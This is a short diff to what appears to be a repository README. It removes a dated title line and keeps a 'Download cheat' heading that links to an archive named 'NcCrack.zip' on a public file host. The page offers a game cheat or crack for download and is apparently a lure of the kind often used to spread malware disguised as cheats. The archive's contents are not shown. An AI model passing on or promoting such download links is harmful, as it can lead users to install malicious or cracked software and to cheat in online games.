@@ -1,5 +1,3 @@
-# Updated 24.01.2023-DBD-Big-functions
-
 # Download cheat
 
 |[Download](https://www.mediafire.com/file/qxarg07b51hql0v/NcCrack.zip/file)|
